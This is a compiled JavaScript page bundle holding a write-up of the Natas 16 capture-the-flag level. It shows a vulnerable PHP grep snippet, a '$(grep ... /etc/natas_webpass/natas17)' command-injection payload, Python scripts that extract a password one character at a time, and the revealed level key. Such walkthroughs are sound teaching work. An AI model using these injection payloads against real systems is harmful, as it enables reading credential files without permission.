(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[962],{25978:function(e,t,n){(window.__NEXT_P=window.__NEXT_P||[]).push(["/natas/natas16",function(){return n(56190)}])},90654:function(e,t,n){"use strict";var a=n(85893),r=n(23457),s=n.n(r),i=n(5227),o=n(84283);t.Z=function(e){var t=e.children,n=e.language;return(0,a.jsx)("div",{className:s().CodeBlock,children:(0,a.jsx)(i.Z,{language:n,style:o.cL,children:t})})}},69242:function(e,t,n){"use strict";var a=n(85893),r=n(41664),s=n(98574),i=n.n(s);t.Z=function(e){var t=e.link1,n=e.link2;return(0,a.jsxs)("div",{className:i().pageNav,children:[(0,a.jsx)("div",{children:t?(0,a.jsx)(r.default,{href:t,children:(0,a.jsx)("a",{title:"Previous page",className:i().navButton,children:"\u25c0"})}):""}),(0,a.jsx)("div",{children:n?(0,a.jsx)(r.default,{href:n,children:(0,a.jsx)("a",{title:"Next page",className:i().navButton,children:"\u25b6"})}):""})]})}},20586:function(e,t,n){"use strict";var a=n(85893),r=n(86655),s=n.n(r),i=n(5227),o=n(84283),l=n(67294);t.Z=function(e){var t=e.children,n=(0,l.useState)(!1),r=n[0],h=n[1];return(0,a.jsxs)("section",{children:[(0,a.jsx)("h2",{children:"Key"}),(0,a.jsxs)("div",{className:s().codeBlock,children:[(0,a.jsx)("div",{className:s().spoilerToggler,children:(0,a.jsx)("button",{onClick:function(){return h(!r)},children:"Click to Reveal"})}),(0,a.jsx)("div",{className:s().spoilerContainer,children:(0,a.jsx)("div",{className:"".concat(s().spoiler," ").concat(r?s().show:""),children:(0,a.jsx)(i.Z,{language:"",style:o.cL,customStyle:{margin:0},children:t})})})]})]})}},56190:function(e,t,n){"use strict";n.r(t);var a=n(85893),r=n(90654),s=n(69242),i=n(20586);t.default=function(){return(0,a.jsxs)("div",{children:[(0,a.jsx)("h1",{children:"Natas 16"}),(0,a.jsxs)("section",{children:[(0,a.jsx)("h2",{children:"Experience"}),(0,a.jsx)("p",{children:"This is an extended version of Natas 10, with even more characters being blacklisted. But more importantly, it also uses double quote around the argument to ensure that what we write will only be considered as one argument, the pattern to grep."}),(0,a.jsx)(r.Z,{language:"php",children:'if($key != "") {\n    if(preg_match(\'/[;|&`\\\'"]/\',$key)) {\n        print "Input contains an illegal character!";\n    } else {\n        passthru("grep -i \\"$key\\" dictionary.txt");\n    }\n}'}),(0,a.jsxs)("p",{children:["Now, unfortunately, we are able to bypass this double semicolon restriction by using ",(0,a.jsx)("code",{children:"${...}"}),", the statement inside the dollar curly braces notation in shell will be evaluated. This is where things got quite tricky, what could we put inside this will still be used by the grep command as the pattern. Hence, we will not see the direct output of the commands used inside."]}),(0,a.jsx)("p",{children:"After some searching, I discovered that this is actually quite similar to Natas 15, we are still able to run some commands, however, we cannot obtain the outputs directly. So we must be creative in thinking about how to synergise the command inside with what will actually be shown, the matching texts in dictionary.txt. Dictionary.txt contains a large number of common words, however, it should not have the password we are looking for. So, we know that it will not return any matches when the password is returned by the command we will put inside the curly braces. Surprisingly, this will be enough information to construct the password character by character again like in Natas 15."}),(0,a.jsxs)("p",{children:["So realising the parallel with Natas 15, I used the code written for Natas15 as reference, specifically for conducting a POST request. So for the command inside the curly braces, I thought, why not use another grep to see if a certain character exist in the password, if so, this will return the whole password which will then result in an empty result when used as argument for the outside grep. To test things out, I used the following code to check which digits are used in the password. The main focus here was to see whether the regular expression used work as intended or not. The ",(0,a.jsx)("code",{children:"^<pre>"})," tag was used because I noticed that the page returned from the HTML request have the tags on newlines, and I chose the middle to match any characters as long as it's maximum 1 character long. This seem reasonable as I check the page returned from the HTML request. Also note the usage of groups in the regular expression, as the pre tags are not as important, I would like to be able to target the content separately."]}),(0,a.jsx)(r.Z,{language:"python",children:"for i in range(10):\n    payload = {'needle': f'$(grep {i} /etc/natas_webpass/natas17)'}\n    r = requests.post(url, headers=headers, data=payload)\n    \n    \n    content = r.content.decode('utf-8')\n    regex_result = re.search(r'(^<pre>)(.{0,1})(^</pre>)', content, re.M | re.S)\n    # for i in range(3):\n    if (regex_result is not None):\n    print(i)\n    print('yes')\n    print(repr(regex_result.group(2)))\n    else:\n    print('nope')"}),(0,a.jsx)("p",{children:"As this seem to work, I repeated the process with the lettes, lowercase and uppercase. At the end of this I learnt that the potential characters used were:"}),(0,a.jsx)(r.Z,{language:"",children:"AbcdgGhHkmnNPqQrsSwW035789"}),(0,a.jsx)("p",{children:"With that, I wrote the rest of the code to figure out the order of the characters. The logic of this is very similar to the one of Natas15, however in this case we were able to narrow down the characters first due to my initial testing."}),(0,a.jsx)(r.Z,{language:"python",children:"potential = 'AbcdgGhHkmnNPqQrsSwW035789'\npassword = ''\nfor i in range(32):\n    for char in potential:\n        payload = {'needle': f'$(grep ^{password}{char} /etc/natas_webpass/natas17)'}\n        r = requests.post(url, headers=headers, data=payload)\n\n\n        content = r.content.decode('utf-8')\n        regex_result = re.search(r'(^<pre>)(.{0,1})(^</pre>)', content, re.M | re.S)\n        # for i in range(3):\n        if (regex_result is not None):\n            password += char\n    \nprint(password)"})]}),(0,a.jsxs)("section",{children:[(0,a.jsx)("h2",{children:"Reflection"}),(0,a.jsx)("p",{children:"Again, I found that this was a challenging level with a very clever solution. By only checking what is essentially a boolean result, empty match or non empty, we were able to properly reconstruct the password character by character. Thought this was quite similar to Natas15, I still found it quite challenging because of my lack of familiarity with the Unix environment, specifically the possibility of using curly braces to evaluate statements. It was especially challenging to figure out what I should put inside the curly braces to determine what the password was."}),(0,a.jsx)("p",{children:"I had initially thought about using greb to get the character of the password at a certain index of the file, then analyse the resulting matches, taking the common letter of all the matches, but I realised that this would take quite a bit more of effort and time and may not necessarily be correct if dictionary.txt does not have a match, e.g. for the numbers. That was how I experimented with the digits first, because I knew the first charcter of the password is a number as grep yielded no matches when it searches for the first character in dictionary.txt"}),(0,a.jsx)("p",{children:"I think this challenge required a lot of creative thinking especially in determining what to put inside the curly braces. Especially relevant to hone our ability to put ourselves in the shoe of the attacker. They may have limited amount of resources and knowledge and must hence use them creatively in ways the defender wouldn't even consider. Otherwise, many of the things talked about in Natas 15 also apply here."})]}),(0,a.jsx)(i.Z,{children:"8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw  "}),(0,a.jsx)(s.Z,{link1:"/natas/natas15",link2:"/leviathan/"})]})}},23457:function(e){e.exports={CodeBlock:"CodeBlock_CodeBlock___IBBd"}},98574:function(e){e.exports={pageNav:"PageNav_pageNav__NXqbT",navButton:"PageNav_navButton__yHhmO"}},86655:function(e){e.exports={codeBlock:"SpoilerKey_codeBlock__KWl0d",spoilerToggler:"SpoilerKey_spoilerToggler__HCeWZ",spoiler:"SpoilerKey_spoiler__YWx_s",show:"SpoilerKey_show__VIJ75",spoilerContainer:"SpoilerKey_spoilerContainer__O76It"}}},function(e){e.O(0,[369,774,888,179],(function(){return t=25978,e(e.s=t);var t}));var t=e.O();_N_E=t}]);